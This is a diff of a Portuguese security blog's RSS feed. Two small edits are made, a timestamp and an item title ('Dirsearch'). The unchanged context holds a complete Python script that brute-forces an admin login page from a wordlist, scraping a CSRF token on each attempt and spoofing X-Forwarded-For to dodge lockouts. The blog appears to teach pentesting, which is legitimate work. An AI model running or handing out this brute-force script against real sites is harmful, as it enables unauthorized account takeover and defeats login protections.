@@ -7,7 +7,7 @@
     <ttl>1440</ttl>
     <generator>Hugo 0.73.0</generator>
     <language>en-us</language>
-    <lastBuildDate>Thu, 23 Jul 2020 03:39:01 UT</lastBuildDate>
+    <lastBuildDate>Thu, 23 Jul 2020 03:41:17 UT</lastBuildDate>
     <atom:link href="/posts/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>Wordlist com Palavras do Site</title>
@@ -24,7 +24,7 @@ $ python3 brute.py
 import re import requests def open_ressources(file_path): return [item.replace(&amp;#34;\n&amp;#34;, &amp;#34;&amp;#34;) for item in open(file_path).readlines()] #alvo host = &amp;#39;http://seualvo.com&amp;#39; #url do login login_url = host &#43; &amp;#39;/admin/login&amp;#39; #user username = &amp;#39;admin&amp;#39; #caminho da wordlist wordlist = open_ressources(&amp;#39;/root/wordlists.txt&amp;#39;) for password in wordlist: session = requests.Session() login_page = session.get(login_url) csrf_token = re.search(&amp;#39;input.&#43;?name=&amp;#34;tokenCSRF&amp;#34;.&#43;?value=&amp;#34;(.&#43;?)&amp;#34;&amp;#39;, login_page.text).group(1) print(&amp;#39;[*] Trying: {p}&amp;#39;.format(p = password)) headers = { &amp;#39;X-Forwarded-For&amp;#39;: password, &amp;#39;User-Agent&amp;#39;: &amp;#39;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36&amp;#39;, &amp;#39;Referer&amp;#39;: login_url } data = { &amp;#39;tokenCSRF&amp;#39;: csrf_token, &amp;#39;username&amp;#39;: username, &amp;#39;password&amp;#39;: password, &amp;#39;save&amp;#39;: &amp;#39;&amp;#39; } login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False) if &amp;#39;location&amp;#39; in login_result.headers: if &amp;#39;/admin/dashboard&amp;#39; in login_result.headers[&amp;#39;location&amp;#39;]: print() print(&amp;#39;SUCCESS: Password found!&amp;#39;) print(&amp;#39;Use {u}:{p} to login.&amp;#39;.format(u = username, p = password)) print() break ]]></content:encoded>
     </item>
     <item>
-      <title></title>
+      <title>Dirsearch</title>
       <link>/posts/dirsearch/</link>
       <pubDate>Thu, 23 Jul 2020 02:37:57 UT</pubDate>
       <guid>/posts/dirsearch/</guid>
